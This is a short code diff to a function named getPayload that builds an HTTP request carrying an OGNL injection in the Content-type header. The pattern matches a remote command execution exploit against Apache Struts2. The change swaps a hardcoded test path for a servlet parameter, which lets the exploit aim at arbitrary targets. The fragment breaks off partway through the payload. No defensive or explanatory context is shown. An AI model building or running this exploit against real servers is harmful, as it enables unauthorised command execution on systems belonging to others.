@@ -1,7 +1,7 @@
 #include "hdr.h"
 
-string getPayload(string target, string cmd) {
-    string payload = "GET /tseting/example/HelloWorld.action HTTP/1.1\r\nHost: " + target + "\r\ncmd: tseting\r\nContent-type: ";
+string getPayload(string target, string servlet, string cmd) {
+    string payload = "GET /" + servlet + "/ HTTP/1.1\r\nHost: " + target + "\r\nContent-type: ";
     payload += "%{";
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).";
     payload += "(#_memberAccess?";
